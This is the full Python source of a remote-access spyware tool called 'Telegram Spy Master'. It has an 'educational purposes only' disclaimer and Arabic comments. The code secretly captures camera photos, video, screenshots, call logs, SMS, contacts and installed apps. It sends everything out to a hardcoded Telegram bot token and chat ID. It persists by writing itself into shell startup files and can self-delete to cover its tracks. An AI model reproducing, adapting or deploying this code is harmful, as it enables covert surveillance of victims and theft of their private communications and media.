#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PROJECT: "Telegram Spy Master (Ultra Optimized)"
# AUTHOR: PhantomScriptVirus
# LEGAL: FOR EDUCATIONAL PURPOSES ONLY

import os
import sys
import base64
import shutil
import platform
import requests
import threading
import subprocess
import tempfile
import time
import json
import sqlite3
import telebot
from telebot import types
import re
import gc
import psutil
from PIL import Image

# ===== OPTIMIZED CONFIGURATION =====
TELEGRAM_TOKEN = "6438089549:AAHbCWCGnF0GtdFygIBoHJWuRnX_zk_5aV8"
TELEGRAM_CHAT_ID = "6063558798"
SYSTEM_ID = base64.b64encode(os.getlogin().encode()).decode() if os.name != 'posix' else base64.b64encode(b"termux_device").decode()
MAX_RETRIES = 3
RETRY_DELAY = 1  # Reduced from 2 to 1
MAX_COMPRESSION_RATIO = 70  # 70% compression for images
SCREENSHOT_QUALITY = 50  # Quality percentage for screenshots

# ===== GLOBAL STATE =====
CURRENT_PATH = os.path.abspath(sys.argv[0])
bot = telebot.TeleBot(TELEGRAM_TOKEN, threaded=True, num_threads=10)  # Increased threads
termux_mode = 'com.termux' in sys.executable
COLLECTED_DATA = {
    "photos": [],
    "videos": [],
    "screenshots": [],
    "calls": [],
    "sms": [],
    "whatsapp": [],
    "instagram": [],
    "telegram": [],
    "emails": [],
    "contacts": [],
    "apps": []
}

# ===== RESOURCE MANAGEMENT =====
def free_up_resources():
    """تحرير الموارد غير المستخدمة وتحسين الذاكرة"""
    try:
        # تنظيف الملفات المؤقتة القديمة
        temp_dir = tempfile.gettempdir()
        for filename in os.listdir(temp_dir):
            file_path = os.path.join(temp_dir, filename)
            if os.path.isfile(file_path) and filename.startswith(('screenshot', 'cam_', 'audio_')):
                file_age = time.time() - os.path.getmtime(file_path)
                if file_age > 120:  # 2 دقائق
                    try:
                        os.remove(file_path)
                    except:
                        pass
        
        # تنظيف ذاكرة Python
        gc.collect()
        
        # إيقاظ الشاشة (لأجهزة Android)
        if termux_mode:
            subprocess.run("termux-wake-lock", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
    except Exception as e:
        pass

# ===== TELEGRAM CONTROL PANEL =====
def create_main_panel():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("📸 أمامي", callback_data="front_photo"),
        types.InlineKeyboardButton("📸 خلفي", callback_data="back_photo"),
        types.InlineKeyboardButton("🖼️ لقطة شاشة", callback_data="screenshot"),
        types.InlineKeyboardButton("🎥 فيديو أمامي", callback_data="front_video"),
        types.InlineKeyboardButton("🎥 فيديو خلفي", callback_data="back_video"),
        types.InlineKeyboardButton("🎤 تسجيل صوت", callback_data="record_audio"),
        types.InlineKeyboardButton("📞 المكالمات", callback_data="get_calls"),
        types.InlineKeyboardButton("📩 الرسائل", callback_data="get_sms"),
        types.InlineKeyboardButton("💬 واتساب", callback_data="get_whatsapp"),
        types.InlineKeyboardButton("👤 جهات الاتصال", callback_data="get_contacts"),
        types.InlineKeyboardButton("📱 التطبيقات", callback_data="get_apps"),
        types.InlineKeyboardButton("📊 البيانات", callback_data="data_panel"),
        types.InlineKeyboardButton("💣 تدمير ذاتي", callback_data="destroy")
    ]
    keyboard.add(*buttons)
    return keyboard

def send_main_panel():
    try:
        bot.send_message(
            TELEGRAM_CHAT_ID,
            "🚀 *لوحة تحكم فانتوم فائقة السرعة* 🚀\n"
            f"`معرف الجهاز: {SYSTEM_ID}`\n"
            f"`النظام: {'Termux' if termux_mode else platform.system()}`\n"
            f"`الذاكرة: {psutil.virtual_memory().percent}% مستخدمة`\n"
            "اختر الإجراء المطلوب:",
            parse_mode="Markdown",
            reply_markup=create_main_panel()
        )
    except Exception as e:
        pass

# ===== OPTIMIZED FILE UPLOAD =====
def compress_and_send(file_path, caption, file_type='photo'):
    """ضغط وإرسال الملفات بسرعة فائقة"""
    try:
        optimized_path = file_path
        
        # ضغط الصور
        if file_path.lower().endswith(('.png', '.jpg', '.jpeg')):
            try:
                with Image.open(file_path) as img:
                    # تقليل الجودة والحجم
                    optimized_path = file_path.replace('.png', '_optimized.jpg').replace('.jpeg', '_optimized.jpg')
                    img.convert('RGB').save(optimized_path, 'JPEG', quality=SCREENSHOT_QUALITY, optimize=True)
            except:
                optimized_path = file_path
        
        # إرسال الملف المضغوط
        with open(optimized_path, 'rb') as file:
            if file_type == 'photo':
                bot.send_photo(TELEGRAM_CHAT_ID, file, caption=caption, timeout=30)
            elif file_type == 'video':
                bot.send_video(TELEGRAM_CHAT_ID, file, caption=caption, timeout=60)
        
        # حذف الملف المضغوط المؤقت
        if optimized_path != file_path:
            try:
                os.remove(optimized_path)
            except:
                pass
        
        return True
    except Exception as e:
        try:
            # المحاولة بإرسال الملف الأصلي كحل بديل
            with open(file_path, 'rb') as file:
                if file_type == 'photo':
                    bot.send_photo(TELEGRAM_CHAT_ID, file, caption=caption, timeout=30)
                elif file_type == 'video':
                    bot.send_video(TELEGRAM_CHAT_ID, file, caption=caption, timeout=60)
            return True
        except:
            bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ فشل في إرسال الملف: {str(e)}")
            return False

# ===== SCREENSHOT CAPTURE (OPTIMIZED) =====
def capture_screenshot():
    """التقاط لقطة شاشة بسرعة"""
    try:
        screenshot_path = os.path.join(tempfile.gettempdir(), 'screenshot.jpg')
        
        if termux_mode:
            # استخدام Termux-API مع ضغط مباشر
            cmd = f"termux-screencap | convert - -quality {SCREENSHOT_QUALITY}% {screenshot_path}"
            subprocess.run(cmd, shell=True, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif platform.system() == "Linux":
            # استخدام أدوات Linux (يتطلب تثبيت scrot)
            cmd = f"scrot -q {SCREENSHOT_QUALITY} {screenshot_path}"
            subprocess.run(cmd, shell=True, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif platform.system() == "Darwin":  # macOS
            cmd = f"screencapture -t jpg -x {screenshot_path}"
            subprocess.run(cmd, shell=True, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif platform.system() == "Windows":
            # استخدام أداة NirCmd (يجب تثبيتها مسبقاً)
            cmd = f"nircmd.exe savescreenshot {screenshot_path}"
            subprocess.run(cmd, shell=True, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
            return screenshot_path
    except:
        pass
    return None

def capture_and_send_screenshot():
    """التقاط وإرسال لقطة الشاشة بسرعة"""
    try:
        screenshot_path = capture_screenshot()
        if screenshot_path:
            # حفظ في الذاكرة
            COLLECTED_DATA["screenshots"].append({
                "name": "لقطة شاشة.jpg",
                "path": screenshot_path
            })
            
            # إرسال عبر التليجرام بسرعة
            threading.Thread(target=compress_and_send, args=(screenshot_path, "🖼️ لقطة شاشة", "photo")).start()
            return True
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ خطأ في التقاط الشاشة: {str(e)}")
    return False

# ===== OPTIMIZED PHOTO CAPTURE =====
def capture_photo(cam_index, cam_name):
    """التقاط صورة بسرعة"""
    try:
        photo_path = os.path.join(tempfile.gettempdir(), f'{cam_name}.jpg')
        
        if termux_mode:
            cmd = f"termux-camera-photo -c {cam_index} {photo_path}"
        elif platform.system() == "Linux":
            cmd = f"ffmpeg -f v4l2 -i /dev/video{cam_index} -frames:v 1 -v quiet {photo_path}"
        elif platform.system() == "Windows":
            cmd = f"ffmpeg -f dshow -i video='Integrated Camera' -frames:v 1 -v quiet {photo_path}"
        
        subprocess.run(cmd, shell=True, timeout=7, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
            return photo_path
    except:
        pass
    return None

def capture_and_send_photo(cam_index, cam_name):
    """التقاط وإرسال الصورة بسرعة"""
    try:
        photo_path = capture_photo(cam_index, cam_name)
        if photo_path:
            # حفظ في الذاكرة
            COLLECTED_DATA["photos"].append({
                "name": f"{cam_name}.jpg",
                "path": photo_path
            })
            
            # إرسال عبر التليجرام بسرعة
            threading.Thread(target=compress_and_send, args=(photo_path, f"📸 {cam_name}", "photo")).start()
            return True
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ خطأ في التقاط الصورة: {str(e)}")
    return False

# ===== OPTIMIZED DATA COLLECTION =====
def collect_and_send_data(data_type, get_function, caption):
    """جمع وإرسال البيانات بشكل متزامن"""
    try:
        free_up_resources()  # تحرير الموارد قبل البدء
        
        data = get_function()
        if data:
            # حفظ في ملف مؤقت
            ext = ".json" if isinstance(data, (dict, list)) else ".txt"
            data_path = os.path.join(tempfile.gettempdir(), f'{data_type}{ext}')
            
            if isinstance(data, (dict, list)):
                with open(data_path, 'w') as f:
                    json.dump(data, f, separators=(',', ':'))  # تقليل حجم JSON
            else:
                with open(data_path, 'w') as f:
                    f.write(data)
            
            # إرسال عبر التليجرام بسرعة
            threading.Thread(target=compress_and_send, args=(data_path, caption, "document")).start()
            return True
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ خطأ في جمع {caption}: {str(e)}")
    return False

# ===== OPTIMIZED DATA COLLECTION IMPLEMENTATIONS =====
def get_call_logs():
    try:
        if termux_mode:
            result = subprocess.run(
                ["termux-call-log", "--limit", "100"],  # تحديد الحد الأدنى
                capture_output=True,
                text=True,
                timeout=15
            )
            if result.returncode == 0:
                return json.loads(result.stdout)
    except:
        pass
    return None

def get_sms_messages():
    try:
        if termux_mode:
            result = subprocess.run(
                ["termux-sms-list", "--limit", "100"],  # تحديد الحد الأدنى
                capture_output=True,
                text=True,
                timeout=15
            )
            if result.returncode == 0:
                return json.loads(result.stdout)
    except:
        pass
    return None

def get_contacts():
    try:
        if termux_mode:
            result = subprocess.run(
                ["termux-contact-list"],
                capture_output=True,
                text=True,
                timeout=15
            )
            if result.returncode == 0:
                return json.loads(result.stdout)
    except:
        pass
    return None

def get_installed_apps():
    try:
        if termux_mode:
            result = subprocess.run(
                ["termux-package-list"],
                capture_output=True,
                text=True,
                timeout=15
            )
            if result.returncode == 0:
                return result.stdout
    except:
        pass
    return None

# ===== OPTIMIZED VIDEO RECORDING =====
def record_video(cam_index, cam_name):
    """تسجيل فيديو بسرعة"""
    try:
        video_path = os.path.join(tempfile.gettempdir(), f'{cam_name}.mp4')
        
        if termux_mode:
            cmd = f"termux-camera-video -c {cam_index} -d 5 -q -o {video_path}"  # تقليل المدة لجودة أفضل
        elif platform.system() == "Linux":
            cmd = f"ffmpeg -f v4l2 -i /dev/video{cam_index} -t 5 -s 640x480 {video_path}"  # تقليل الدقة
        elif platform.system() == "Windows":
            cmd = f"ffmpeg -f dshow -i video='Integrated Camera' -t 5 -s 640x480 {video_path}"  # تقليل الدقة
        
        subprocess.run(cmd, shell=True, timeout=10, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if os.path.exists(video_path) and os.path.getsize(video_path) > 0:
            return video_path
    except:
        pass
    return None

def record_and_send_video(cam_index, cam_name):
    """تسجيل وإرسال الفيديو بسرعة"""
    try:
        video_path = record_video(cam_index, cam_name)
        if video_path:
            # حفظ في الذاكرة
            COLLECTED_DATA["videos"].append({
                "name": f"{cam_name}.mp4",
                "path": video_path
            })
            
            # إرسال عبر التليجرام بسرعة
            threading.Thread(target=compress_and_send, args=(video_path, f"🎥 {cam_name}", "video")).start()
            return True
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ خطأ في تسجيل الفيديو: {str(e)}")
    return False

# ===== SELF-DESTRUCT =====
def self_destruct():
    """التدمير الذاتي السريع"""
    try:
        bot.send_message(TELEGRAM_CHAT_ID, "💥 جارٍ التدمير الذاتي...")
        
        # إنشاء سكريبت الحذف السريع
        if os.name == 'nt':
            batch_script = f"""
            @echo off
            timeout /t 2 /nobreak >nul
            del /f /q "{CURRENT_PATH}"
            del "%~f0"
            """
            ext = ".bat"
        else:
            batch_script = f"""#!/bin/bash
            sleep 2
            rm -f "{CURRENT_PATH}"
            rm -- "$0"
            """
            ext = ".sh"
        
        script_path = os.path.join(tempfile.gettempdir(), f'cleanup{ext}')
        with open(script_path, 'w') as f:
            f.write(batch_script)
        
        if os.name == 'nt':
            subprocess.Popen(['cmd.exe', '/C', script_path], creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            os.chmod(script_path, 0o755)
            subprocess.Popen(['/bin/bash', script_path])
        
        sys.exit(0)
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ فشل في التدمير الذاتي: {str(e)}")

# ===== OPTIMIZED TELEGRAM HANDLERS =====
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if str(message.chat.id) == TELEGRAM_CHAT_ID:
        free_up_resources()
        send_main_panel()

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if str(call.message.chat.id) == TELEGRAM_CHAT_ID:
        # تحرير الموارد قبل كل عملية
        free_up_resources()
        
        if call.data == "front_photo":
            bot.answer_callback_query(call.id, "جارٍ التقاط صورة أمامية...")
            threading.Thread(target=lambda: capture_and_send_photo(0, "كاميرا أمامية")).start()
        elif call.data == "back_photo":
            bot.answer_callback_query(call.id, "جارٍ التقاط صورة خلفية...")
            threading.Thread(target=lambda: capture_and_send_photo(1, "كاميرا خلفية")).start()
        elif call.data == "screenshot":
            bot.answer_callback_query(call.id, "جارٍ التقاط الشاشة...")
            threading.Thread(target=capture_and_send_screenshot).start()
        elif call.data == "front_video":
            bot.answer_callback_query(call.id, "جارٍ تسجيل فيديو أمامي...")
            threading.Thread(target=lambda: record_and_send_video(0, "فيديو أمامي")).start()
        elif call.data == "back_video":
            bot.answer_callback_query(call.id, "جارٍ تسجيل فيديو خلفي...")
            threading.Thread(target=lambda: record_and_send_video(1, "فيديو خلفي")).start()
        elif call.data == "get_calls":
            bot.answer_callback_query(call.id, "جارٍ جمع سجل المكالمات...")
            threading.Thread(target=collect_and_send_data, args=("calls", get_call_logs, "📞 سجل المكالمات")).start()
        elif call.data == "get_sms":
            bot.answer_callback_query(call.id, "جارٍ جمع الرسائل النصية...")
            threading.Thread(target=collect_and_send_data, args=("sms", get_sms_messages, "📩 الرسائل النصية")).start()
        elif call.data == "get_contacts":
            bot.answer_callback_query(call.id, "جارٍ جمع جهات الاتصال...")
            threading.Thread(target=collect_and_send_data, args=("contacts", get_contacts, "👤 جهات الاتصال")).start()
        elif call.data == "get_apps":
            bot.answer_callback_query(call.id, "جارٍ جمع التطبيقات...")
            threading.Thread(target=collect_and_send_data, args=("apps", get_installed_apps, "📱 التطبيقات المثبتة")).start()
        elif call.data == "destroy":
            bot.answer_callback_query(call.id, "جارٍ التمهيد للتدمير الذاتي...")
            bot.send_message(TELEGRAM_CHAT_ID, "⚠️ تأكيد التدمير الذاتي؟ سيتم حذف البرنامج نهائيًا!", 
                             reply_markup=types.InlineKeyboardMarkup().row(
                                 types.InlineKeyboardButton("✅ تأكيد", callback_data="confirm_destroy"),
                                 types.InlineKeyboardButton("❌ إلغاء", callback_data="cancel_destroy")
                             ))
        elif call.data == "confirm_destroy":
            bot.answer_callback_query(call.id, "تم تأكيد التدمير الذاتي!")
            threading.Thread(target=self_destruct).start()
        elif call.data == "cancel_destroy":
            bot.answer_callback_query(call.id, "تم إلغاء التدمير الذاتي!")
            free_up_resources()
            send_main_panel()

def telegram_polling():
    """تشغيل بوت التليجرام بسرعة فائقة"""
    while True:
        try:
            bot.polling(none_stop=True, skip_pending=True, timeout=20)
        except Exception as e:
            time.sleep(5)

# ===== OPTIMIZED PERSISTENCE =====
def install_persistence():
    """تركيب البرنامج للعمل عند بدء التشغيل"""
    # وضع Termux
    if termux_mode:
        try:
            # إنشاء مجلد الثبات
            persist_dir = os.path.expanduser("~/.phantom")
            os.makedirs(persist_dir, exist_ok=True)
            
            # نسخ الملف الحالي
            target_path = os.path.join(persist_dir, "phantom_spy")
            if not os.path.exists(target_path):
                shutil.copyfile(CURRENT_PATH, target_path)
                os.chmod(target_path, 0o755)
                CURRENT_PATH = target_path
            
            # إضافة إلى ملفات التشغيل التلقائي
            for rc_file in ['.bashrc', '.zshrc']:
                rc_path = os.path.expanduser(f'~/{rc_file}')
                startup_cmd = f"python {CURRENT_PATH} &\n"
                
                if not os.path.exists(rc_path):
                    with open(rc_path, 'w') as f:
                        f.write(startup_cmd)
                else:
                    with open(rc_path, 'r+') as f:
                        content = f.read()
                        if startup_cmd not in content:
                            f.write(startup_cmd)
        except:
            pass

# ===== MAIN =====
def main():
    # إعدادات الأداء
    os.environ['OMP_NUM_THREADS'] = '1'
    os.environ['OPENBLAS_NUM_THREADS'] = '1'
    os.environ['MKL_NUM_THREADS'] = '1'
    
    # تركيب الثبات
    install_persistence()
    
    # إرسال إشعار الاتصال
    try:
        bot.send_message(
            TELEGRAM_CHAT_ID,
            f"⚡ جهاز جديد متصل بسرعة فائقة! ⚡\n"
            f"```\nالنظام: {'Termux' if termux_mode else platform.system()}\n"
            f"المسار: {CURRENT_PATH}\n"
            f"الوقت: {time.ctime()}\n```",
            parse_mode="Markdown"
        )
        send_main_panel()
    except:
        pass

    # بدء تشغيل البوت
    threading.Thread(target=telegram_polling, daemon=True).start()
    
    # تنظيف دوري للموارد
    def periodic_cleanup():
        while True:
            time.sleep(120)  # كل دقيقتين
            free_up_resources()
    
    threading.Thread(target=periodic_cleanup, daemon=True).start()
    
    # إبقاء البرنامج نشطًا
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
